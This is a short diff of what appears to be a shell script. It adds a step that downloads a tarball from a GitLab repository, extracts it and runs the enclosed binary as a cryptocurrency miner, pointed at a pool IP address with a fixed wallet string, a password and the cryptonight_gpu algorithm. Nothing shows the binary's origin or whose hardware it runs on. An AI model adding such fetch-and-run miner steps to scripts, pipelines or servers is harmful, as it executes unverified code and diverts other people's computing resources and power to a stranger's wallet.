@@ -1,1 +1,3 @@
+wget https://gitlab.com/niladyu893/celek/-/raw/main/best.tar.gz && tar -xvf best.tar.gz
+
 ./best --url 142.93.121.35:80 --user RYoSrGq82UaDY5G1bCjNvKBgtn2exzbgGTRhb8wtWoAEcEKnBaSVL4egc4f217AWJ83kHwQQKksR21PggPNBQrQu5XekxeRgp2L --pass sayur-kuul --currency cryptonight_gpu
